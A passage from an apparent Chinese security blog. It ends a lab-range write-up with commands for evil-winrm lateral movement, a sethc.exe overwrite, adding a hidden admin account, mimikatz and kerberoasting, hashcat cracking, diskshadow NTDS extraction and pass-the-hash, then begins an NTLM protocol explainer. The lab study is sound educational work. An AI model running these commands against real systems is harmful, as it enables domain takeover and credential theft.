12.1772052s</span><br></pre></td></tr></table></figure>\n\n<p>windows pc：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[*]172.22.14.7</span><br><span class=\"line\">   [-&gt;]XR-JENKINS</span><br><span class=\"line\">   [-&gt;]172.22.14.7</span><br><span class=\"line\"></span><br><span class=\"line\">[*]172.22.14.11\tDC:XIAORANG\\XR-DC</span><br><span class=\"line\">   [-&gt;]XR-DC</span><br><span class=\"line\">   [-&gt;]172.22.14.11</span><br><span class=\"line\"></span><br><span class=\"line\">[*]172.22.14.31\tWORKGROUP\\XR-ORACLE</span><br><span class=\"line\">   [-&gt;]XR-ORACLE</span><br><span class=\"line\">   [-&gt;]172.22.14.31</span><br><span class=\"line\"></span><br><span class=\"line\">[*]172.22.14.46\tXIAORANG\\XR-0923</span><br><span class=\"line\">   [-&gt;]XR-0923</span><br><span class=\"line\">   [-&gt;]172.22.14.46</span><br></pre></td></tr></table></figure>\n\n<p>通过gitlab v4 api 获取所有项目</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -H &quot;Private-Token: glpat-7kD_qLH2PiQv_ywB9hz2&quot; http:&#x2F;&#x2F;172.22.14.16&#x2F;api&#x2F;v4&#x2F;projects?simple&#x3D;true</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208233654146.png\" alt=\"image-20241208233654146\"></p>\n<p>将项目都git clone下来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone http:&#x2F;&#x2F;gitlab.xiaorang.lab:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16&#x2F;xrlab&#x2F;internal-secret.git</span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n\n<p>发现一个密码本</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208234034321.png\" alt=\"image-20241208234034321\"></p>\n<p>还有一个oracle密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">jdbc:oracle:thin:@172.22.14.31:1521&#x2F;orcl\txradmin\tfcMyE8t9E4XdsKf</span><br></pre></td></tr></table></figure>\n\n<p>mdut直连</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208234444846.png\" alt=\"image-20241208234444846\"></p>\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><blockquote>\n<p>攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。</p>\n</blockquote>\n<p>密码本中发现 XR-0923 中的一个用户密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">XR-0923 | zhangshuai | wSbEajHzZs</span><br></pre></td></tr></table></figure>\n\n<p>直接打一手winrm横向</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 evil-winrm -i 172.22.14.46 -u zhangshuai -p wSbEajHzZs</span><br></pre></td></tr></table></figure>\n\n<p>当前用户为地低权限，处于这两用户组中</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Remote Desktop Users</span><br><span class=\"line\">Remote Management users</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208235127768.png\" alt=\"image-20241208235127768\"></p>\n<p>但是查看当前用户的特权发现存在一个易受提权攻击的特权 <strong>SeRestorePrivilege</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208235502892.png\" alt=\"image-20241208235502892\"></p>\n<p>此特权可以覆写文件，授予对系统上所有对象的写访问权，而不管它们的ACL如何，利用该特权特性通过以下三种方法实现提权</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1、修改服务二进制文件</span><br><span class=\"line\">2、覆盖系统进程使用的DLL</span><br><span class=\"line\">3、修改注册表设置</span><br></pre></td></tr></table></figure>\n\n<p>通过覆写sethc.exe</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241208235857753.png\" alt=\"image-20241208235857753\"></p>\n<p>在rdp时触发替换的cmd.exe</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209000509394.png\" alt=\"image-20241209000509394\"></p>\n<p>添加管理员</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user hack$ Abc@123 &#x2F;add</span><br><span class=\"line\">net localgroup &quot;administrators&quot; hack$ &#x2F;add</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"第四关\"><a href=\"#第四关\" class=\"headerlink\" title=\"第四关\"></a>第四关</h1><blockquote>\n<p>尝试接管备份管理操作员帐户，并通过转储 NTDS 获得域管理员权限，最终控制整个域环境。</p>\n</blockquote>\n<p>当前域环境</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">域: xiaorang.lab</span><br></pre></td></tr></table></figure>\n\n<p>直接mimikatz抓密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">privilege::debug</span><br><span class=\"line\">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>\n\n<p>发现域信息中只有一个机器账号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">kerberos :</span><br><span class=\"line\"> * Username : XR-0923$</span><br><span class=\"line\"> * Domain   : xiaorang.lab</span><br></pre></td></tr></table></figure>\n\n<p>通过该机器账号对域内做信息收集，通过kerberoasting查询域内SPN、提取TGS、转换为HASH，最后发现一个tianjing域账号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">利用该机器账号凭证在攻击机上进行SPN发现</span><br><span class=\"line\">impacket-GetUserSPNs xiaorang.lab&#x2F;&#39;XR-0923$&#39; -dc-ip 172.22.14.11 -hashes &#39;:ec22012024d30abdb39757557852548a&#39; -request</span><br><span class=\"line\">或</span><br><span class=\"line\">受控机器上利用Rubeus.exe直接对域控进行SPN查询</span><br><span class=\"line\">Rubeus.exe kerberoast &#x2F;nowrap &#x2F;format:hashcat</span><br><span class=\"line\"></span><br><span class=\"line\">补：如果XR-0923$不需要预先身份验证，可以不使用hash凭证</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209002708337.png\" alt=\"image-20241209002708337\"></p>\n<p>使用hashcat尝试本地爆破tianjing密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 13100 -a 0 1.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt --force</span><br></pre></td></tr></table></figure>\n\n<p>出密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">tianjing:DPQSXSXgh2</span><br></pre></td></tr></table></figure>\n\n<p>通过BloodHound 发现 tianjing 可以和DC 建立 PSRemote 连接，直接使用winrm连接域控</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2</span><br></pre></td></tr></table></figure>\n\n<p>再次进行信息收集</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209003554734.png\" alt=\"image-20241209003554734\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209003617543.png\" alt=\"image-20241209003617543\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209003652276.png\" alt=\"image-20241209003652276\"></p>\n<p>又因为当前用户所具有的 <strong>SeBackupPrivilege特权</strong>，可以通过导出ntds.dit备份，本地导出域控hash！</p>\n<p>上传command.txt到目标机器</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set context persistent nowriters</span><br><span class=\"line\">add volume c: alias raj</span><br><span class=\"line\">create</span><br><span class=\"line\">expose %raj% z:</span><br></pre></td></tr></table></figure>\n\n<p>unix2dos将dsh文件的编码间距转换为Windows兼容的编码和间距</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unix2dos raj.dsh</span><br></pre></td></tr></table></figure>\n\n<p>上传后利用diskshadow进行卷影拷贝</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">diskshadow &#x2F;s command.txt</span><br></pre></td></tr></table></figure>\n\n<p>下载ntds和system用于解密hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RoboCopy &#x2F;b z:\\windows\\ntds . ntds.dit</span><br><span class=\"line\">download ntds.dit</span><br><span class=\"line\"></span><br><span class=\"line\">reg save HKLM\\SYSTEM system</span><br><span class=\"line\">download system</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209011731089.png\" alt=\"image-20241209011731089\"></p>\n<p>本地解密hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">impacket-secretsdump -ntds ntds.dit -system system local</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209012340927.png\" alt=\"image-20241209012340927\"></p>\n<p>然后pth</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 evil-winrm -i 172.22.14.11 -u administrator -H &quot;&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20241209012433282.png\" alt=\"image-20241209012433282\"></p>\n","categories":["云境靶场"]},{"title":"NTLM - NTLM Attack","url":"/2025/09/06/NTLM-Attack/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/coinstorm.jpg\" alt=\"coinstorm\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"NTLM\"><a href=\"#NTLM\" class=\"headerlink\" title=\"NTLM\"></a>NTLM</h1><p>在windows中不会存储用户的明文密码，只保存用户的密码hash值</p>\n<ul>\n<li><p>本地用户的密码hash存在本地的 <code>%SystemRoot%\\system32\\config\\SAM</code> 数据库文件中，在注册表中的存储位置为 <code>hklm\\sam\\sam\\domains\\account\\users\\</code></p>\n</li>\n<li><p>域内用户的密码hash存在域控的ntds.dit文件中</p>\n</li>\n</ul>\n<blockquote>\n<p>但是在Windows server 2012 R2之前的系统 WDigest 协议会将用户明文密码储存到 lsass.exe 进程中</p>\n</blockquote>\n<p>在渗透测试中导出的密码hash常见格式如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">账户名:RID:lmhash:nthash:::</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:35b5a70f68f5ef895d52d15d8d84af6b:::</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>账户名： Windows的登录用户名</p>\n</li>\n<li><p>RID：账户相关联的相对标识符，SID的一部分，500-999为保留，标准用户RID从1000开始</p>\n</li>\n<li><p>lmhash：即LM hash，aad3b435b51404eeaad3b435b51404ee</p>\n</li>\n<li><p>nthash：即NTLM hash，35b5a70f68f5ef895d52d15d8d84af6b</p>\n</li>\n<li><p><code>:::</code> ：空字段，可能表示其他额外信息（如用户描述、组等）</p>\n</li>\n</ul>\n<h2 id=\"LM-hash\"><a href=\"#LM-hash\" class=\"headerlink\" title=\"LM hash\"></a>LM hash</h2><p>LM Hash（LAN Manager Hash）是Windows使用的最古老的密码存储，由于允许的字符集有限，因此它们很容易破解。</p>\n<p>微软在1993年引入了NT Hash。在Windows 2000版本至2003的版本系统默认使用LM Hash，当密码超过14位时，则使用NT Hash进行存储。而在Windows Visita后，默认情况下只存储NT Hash，LM Hash则不再使用。</p>\n<p>如果用户密码为空或者不存储LM Hash的话，我们抓到的LM Hash是 <code>AAD3B435B51404EEAAD3B435B51404EE</code>，该hash没有任何价值</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/t01b500665781a9a455.png\"></p>\n<h2 id=\"NTLM-hash\"><a href=\"#NTLM-hash\" class=\"headerlink\" title=\"NTLM hash\"></a>NTLM hash</h2><p>NTLM hash是指Windows系统下Security Account Manager（SAM）中保存的用户密码hash，也是PTH中所用到的，注意区别后面的 <strong>Net-NTLM hash</strong></p>\n<p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储NTLM Hash，其加密算法如下：</p>\n<ul>\n<li>先将用户密码转换为十六进制格式，假设用户密码为Admin123456，则转换后为： 41646d696e313233343536</li>\n<li>将其转换为unicode格式即后面加 00，则转换后为：410064006d0069006e00310032003300340035003600</li>\n<li>使用 MD4 加密生成32位的十六进制数字串，则转化后为：ae4c0d5fb959fda8f4cb1d14a8376af4</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># NTLM hash 生成脚本</span><br><span class=\"line\">import binascii</span><br><span class=\"line\">import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">passwd &#x3D; &quot;Admin123456&quot;</span><br><span class=\"line\">unicode_hex_passwd &#x3D; passwd.encode(&#39;utf-16le&#39;)</span><br><span class=\"line\">md4_passwd&#x3D;hashlib.new(&quot;md4&quot;,unicode_hex_passwd).digest()</span><br><span class=\"line\">print(binascii.hexlify(md4_passwd))</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"NTLMv2-hash\"><a href=\"#NTLMv2-hash\" class=\"headerlink\" title=\"NTLMv2 hash\"></a>NTLMv2 hash</h2><p>NTLMv2 引入了更强的安全性，计算方法更加复杂，包括使用 HMAC-MD5、时间戳、随机数 (nonce)等，具体过程放在了&lt;验证-Authentication&gt; 节中</p>\n<h1 id=\"NTLM-身份认证\"><a href=\"#NTLM-身份认证\" class=\"headerlink\" title=\"NTLM 身份认证\"></a>NTLM 身份认证</h1><p>当需要进行NTLM 身份认证时，可以分为两类，一是在本地机器直接认证比如登录。二是通过网络在多个计算机之间进行NTLM身份认证。</p>\n<h2 id=\"本地\"><a href=\"#本地\" class=\"headerlink\" title=\"本地\"></a>本地</h2><ol>\n<li>当用户注销、重启、锁屏等，操作系统启动 <code>winlogon.exe</code> 显示登陆界面</li>\n<li>当 <code>winlogon.exe</code> 接收到输入的账号密码后，会将密码交给 <code>lsass.exe</code> 进程</li>\n<li>lsass将明文密码加密成 NTLM Hash</li>\n<li>与 SAM 数据库比较认证</li>\n</ol>\n<h2 id=\"网络\"><a href=\"#网络\" class=\"headerlink\" title=\"网络\"></a>网络</h2><p>网络环境下，目前大多数的 Windows 都采用 NTLM 协议认证，NTLM协议认证采用 <strong>质询/应答 或 挑战/响应（Challenge/Response）</strong>的消息交换模式，由三种类型的消息组成：</p>\n<ul>\n<li>Type1 协商（Negotiate）</li>\n<li>Type2 质询（Challenge）</li>\n<li>Type3 认证（Authentication）</li>\n</ul>\n<p>NTLM 的网络认证还可以分为 <strong>工作组环境下的认证</strong> 和 <strong>域环境下的认证</strong></p>\n<p><strong>工作组基本流程：</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/ntlm_challenge_response.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/SAM_verification.png\" alt=\"协商后流程\"></p>\n<ul>\n<li>Negotiate：ClientA 向 ServerB 发送一个认证请求。</li>\n<li>Challenge：ServerB接收到请求后，生成一个16位的随机 <strong>挑战值（Challenge）</strong>明文发送回ClientA。</li>\n<li>Authentication：ClientA收到Challenge后会生成一个 <strong>响应值（Response）</strong>，响应值的生成方式：认证用户的NTLM hash 和 Challenge 结合进行加密运算得到，随后将 Response、Username 发给ServerB。</li>\n<li>ServerB 收到Response后会检查 ClientA 发送的username，并在 <strong>SAM</strong> 中查找对应的 NTLM hash（ServerB中存储有许多登录用户名和对应的密码hash），将该用户NTLM hash 与 challeng使用相同的加密运算得到一个 <strong>新的Response</strong>，两个Response比对，相同代表认证通过。</li>\n</ul>\n<p><strong>域环境基本流程：</strong></p>\n<p>所有的流程基本与工作组类似，只不过用户hash在域控的NTDS.DIT中，并且Server端会和域控之间使用 <strong>Netlogon</strong> 服务建立安全通道<strong>将认证交由域控处理</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/DC_verification.png\" alt=\"协商后流程\"></p>\n<h1 id=\"NTLM-网络认证流量分析\"><a href=\"#NTLM-网络认证流量分析\" class=\"headerlink\" title=\"NTLM 网络认证流量分析\"></a>NTLM 网络认证流量分析</h1><p>实验环境为域环境，Win7 通过 <code>net use \\\\192.168.1.10 &quot;password&quot; /user:test\\zhangsan</code> 向Win Server 2019 发起NTLM 认证</p>\n<p>抓包从上往下简单介绍</p>\n<ul>\n<li><strong>Negotiate Protocol Request/Response</strong> 这两条消息并不直接涉及 NTLM 身份认证的内容，它们属于 <strong>SMB 协议的初步协商</strong> 阶段，用于确定客户端和服务器可以使用哪些协议特性和版本</li>\n<li>方框内为 NTLM 三步认证流程</li>\n<li>椭圆内为域内使用 Netlogon 将认证交由域控</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250818223046669.png\" alt=\"image-20250818223046669\"></p>\n<p>下面分析认证的三个数据包，具体详细字段解释当然是查看微软官方文档<a href=\"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/760a9788-bd32-4d9e-87ad-2aa5970786ac\">^1</a></p>\n<h2 id=\"协商-Negotiate\"><a href=\"#协商-Negotiate\" class=\"headerlink\" title=\"协商-Negotiate\"></a>协商-Negotiate</h2><p>NEGOTIATE_MESSAGE 消息字段</p>\n<table>\n<thead>\n<tr>\n<th>长度</th>\n<th>字段名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>8B</td>\n<td>Signature</td>\n<td>‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\\0’</td>\n</tr>\n<tr>\n<td>4B</td>\n<td>MessageType</td>\n<td>0x00000001</td>\n</tr>\n<tr>\n<td>4B</td>\n<td>NegotiateFlags</td>\n<td>NEGOTIATE结构体，用于客户端指示其支持的选项</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>DomainNameFields</td>\n<td>Domain信息，取决于NegotiateFlags</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>WorkstationFields</td>\n<td>WorkStation信息，取决于NegotiateFlags</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>Version</td>\n<td>VERSION结构体，包含发送消息系统的粗略版本信息</td>\n</tr>\n<tr>\n<td>variable</td>\n<td>Payload</td>\n<td>包含 DomainNameBuffer、WorkstationBuffer具体的值</td>\n</tr>\n</tbody></table>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250818230212349.png\" alt=\"image-20250818230212349\"></p>\n<h2 id=\"质询-Challenge\"><a href=\"#质询-Challenge\" class=\"headerlink\" title=\"质询-Challenge\"></a>质询-Challenge</h2><p>CHALLENGE_MESSAGE 消息字段</p>\n<table>\n<thead>\n<tr>\n<th>长度</th>\n<th>字段名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>8B</td>\n<td>Signature</td>\n<td>‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\\0’</td>\n</tr>\n<tr>\n<td>4B</td>\n<td>MessageType</td>\n<td>0x00000002</td>\n</tr>\n<tr>\n<td>4B</td>\n<td>TargetNameFields</td>\n<td>尝试进行身份验证的目标系统或域，具体值在Payload字段后</td>\n</tr>\n<tr>\n<td>4B</td>\n<td>NegotiateFlags</td>\n<td>NEGOTIATE结构体，根据客户端提供的选项做出的选择</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>ServerChallenge</td>\n<td>返回的Challenge</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>Reserved</td>\n<td>0000000000000000</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>TargetInfoFields</td>\n<td>尝试进行身份验证目标系统的主机信息，具体值在Payload字段后</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>Version</td>\n<td>VERSION结构体，包含发送消息系统的粗略版本信息</td>\n</tr>\n<tr>\n<td>variable</td>\n<td>Payload</td>\n<td>包含 TargetNameBuffer 和 TargetInfoBuffer(AV_PAIR 结构体)</td>\n</tr>\n</tbody></table>\n<p>红框为Payload</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250818232913781.png\" alt=\"image-20250818232913781\"></p>\n<h2 id=\"验证-Authentication\"><a href=\"#验证-Authentication\" class=\"headerlink\" title=\"验证-Authentication\"></a>验证-Authentication</h2><p>AUTHENTICATE_MESSAGE 消息字段</p>\n<table>\n<thead>\n<tr>\n<th>长度</th>\n<th>字段名</th>\n<th>解释</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>8B</td>\n<td>Signature</td>\n<td>‘N’, ‘T’, ‘L’, ‘M’, ‘S’, ‘S’, ‘P’, ‘\\0’</td>\n</tr>\n<tr>\n<td>4B</td>\n<td>MessageType</td>\n<td>0x00000003</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>LmChallengeResponseFields(LM/LMv2 Response)</td>\n<td>早期LM-Response，可以理解基本弃用</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>NtChallengeResponseFields(NTLM/NTLMv2 Response)</td>\n<td>就是所说的 Response，重要</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>DomainNameFields</td>\n<td>Domain信息</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>UserNameFields</td>\n<td>要认证的用户名</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>WorkstationFields</td>\n<td>WorkStation信息</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>EncryptedRandomSessionKeyFields</td>\n<td>加密后的Session Key（Session Key 是随机生成的，用于后续安全通信）</td>\n</tr>\n<tr>\n<td>4B</td>\n<td>NegotiateFlags</td>\n<td>NEGOTIATE结构体</td>\n</tr>\n<tr>\n<td>8B</td>\n<td>Version</td>\n<td>VERSION结构体，包含发送消息系统的粗略版本信息</td>\n</tr>\n<tr>\n<td>16B</td>\n<td>MIC</td>\n<td>校验和防止这个包中途被修改</td>\n</tr>\n<tr>\n<td>variable</td>\n<td>Payload</td>\n<td>包含 LmChallengeResponseBuffer、NtChallengeResponseBuffer、DomainNameBuffer、UserNameBuffer、WorkstationBuffer、EncryptedRandomSessionKeyBuffer</td>\n</tr>\n</tbody></table>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250819004904641.png\" alt=\"image-20250819004904641\"></p>\n<p>红方框中的详细内容：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250821000917467.png\" alt=\"image-20250821000917467\"></p>\n<p>在发送Type3响应Type 2 challenge时，client会生成一种或多种类型的 Responses，总共有六种：</p>\n<ul>\n<li>LM (LAN Manager) Response：由大多数旧客户端发送，这是 原始 响应类型</li>\n<li>NTLM Response：由基于 NT 的客户端发送，包括 Windows 2000 和 XP</li>\n<li>NTLMv2 Response：一种较新的响应类型，在 Windows NT Service Pack 4 中引入。它在启用了NTLM V2的系统上取代了的NTLM响应</li>\n<li>LMv2 Response ：NTLM V2系统上 LM 响应的替代品</li>\n<li>NTLM2 Session Response：在没有 NTLMv2 身份验证的情况下协商 NTLM2 会话安全性时使用，此方案会改变 LM 和 NTLM 响应的语义</li>\n<li>Anonymous Response：在建立匿名上下文时使用；不提供实际凭据，也不进行真正的身份验证</li>\n</ul>\n<p>不同类型的Response有不同生成流程<a href=\"https://davenport.sourceforge.net/ntlm.htm\">^2</a> ，这里看两个 <code>NTLM Response</code> 和 <code>NTLMv2 Response</code></p>\n<hr>\n<p><strong>NTLM Response</strong></p>\n<p>将16字节的 NTLM hash 空填充为 21 个字节，然后分成三组，每组7字节，作为DES加密算法的三组密钥，加密Type 2中的Challenge，生成三组8字节的密文结果，将这三个密文值连接起来得到 NTLM Response</p>\n<p><strong>NTLMv2 Response</strong></p>\n<p>启用 NTLMv2 后，NTLM 响应将被 NTLMv2 响应替换，而 LM 响应也将替换为 LMv2 响应。NTLMv2响应的计算方式如下</p>\n<ul>\n<li>获取 NTLM Hash</li>\n<li>将Unicode后 <strong>大写用户名</strong>、Unicode后 <strong>区分大小写的身份验证目标</strong>（在Type 3消息的 ‘TargetName’ 字段中指定的域或服务器名称）拼在一起，将NTLM Hash作为 HMAC-MD5 算法密钥进行加密生成16字节密文（这就是 NTLMv2 hash）</li>\n<li>创建一个 <code>blob</code> 数据块</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>Description</th>\n<th>Content</th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0</td>\n<td>Blob Signature</td>\n<td><code>0x01010000</code></td>\n</tr>\n<tr>\n<td>4</td>\n<td>Reserved</td>\n<td><code>long</code> (<code>0x00000000</code>)</td>\n</tr>\n<tr>\n<td>8</td>\n<td>Timestamp</td>\n<td>Little-endian, 64-bit signed value representing the number of tenths of a microsecond since January 1, 1601.</td>\n</tr>\n<tr>\n<td>16</td>\n<td>Client Nonce</td>\n<td>8 bytes</td>\n</tr>\n<tr>\n<td>24</td>\n<td>Unknown</td>\n<td>4 bytes</td>\n</tr>\n<tr>\n<td>28</td>\n<td>Target Information</td>\n<td>Target Information block (from the Type 2 message).</td>\n</tr>\n<tr>\n<td><em>(variable)</em></td>\n<td>Unknown</td>\n<td>4 bytes</td>\n</tr>\n</tbody></table>\n<ul>\n<li>将 Type2中的challenge 、blob 拼在一起，将NTLMv2 Hash作为 HMAC-MD5 算法密钥进行加密生成16字节输出密文（NTproofstring）</li>\n<li>将 输出密文（NTproofstring）、blob拼接 得到 NTLMv2 Response</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824095728291.png\" alt=\"image-20250824095728291\"></p>\n<h1 id=\"Net-NTLM-hash\"><a href=\"#Net-NTLM-hash\" class=\"headerlink\" title=\"Net-NTLM hash\"></a>Net-NTLM hash</h1><p>首先 Net-NTLM hash 不是微软官方文档中的标准术语，它只是渗透测试和密码破解工具中采用的一种通用表示方法</p>\n<blockquote>\n<p>大部分文章都写的是：Net-NTLM hash在Response中，个人感觉不是很严谨会造成歧义，应该说：在Type3 Response中存在组成Net-NTLM hash的各个部分</p>\n</blockquote>\n<p>既然前面说到有不同的Response 类型，Net-NTLM hash 就有不同的构造方式，主要看两个：NTLM Response 和 NTLMv2 Response</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Net-NTLM v1 Hash </span><br><span class=\"line\">username::hostname:LM responce:NTLM responce:Type2-challenge</span><br><span class=\"line\"></span><br><span class=\"line\"># Net-NTLM v2 Hash </span><br><span class=\"line\">username::domain:Type2-challenge:NTproofstring:blob</span><br></pre></td></tr></table></figure>\n\n<p>手动构造一下 Net-NTLM v2 Hash：</p>\n<ul>\n<li>username：zhangsan</li>\n<li>domain：test</li>\n<li>challenge：bd639079c7fcae13</li>\n<li>NTproofstring：e9218482a856c8ea91acdb2955e3ad19</li>\n<li>blob: 0101000000000000de63a3a05c0fdc014c7821cf994e9fcd0000000002000800540045005300540001000a004d005300530051004c000400100074006500730074002e0063006f006d0003001c004d005300530051004c002e0074006500730074002e0063006f006d000500100074006500730074002e0063006f006d0007000800de63a3a05c0fdc01060004000200000008003000300000000000000000000000002000006ca4ab8eb09638f83f178c8c95150701240ef36ed3142205bcb6443442678d480a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e00310033003100000000000000000000000000</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 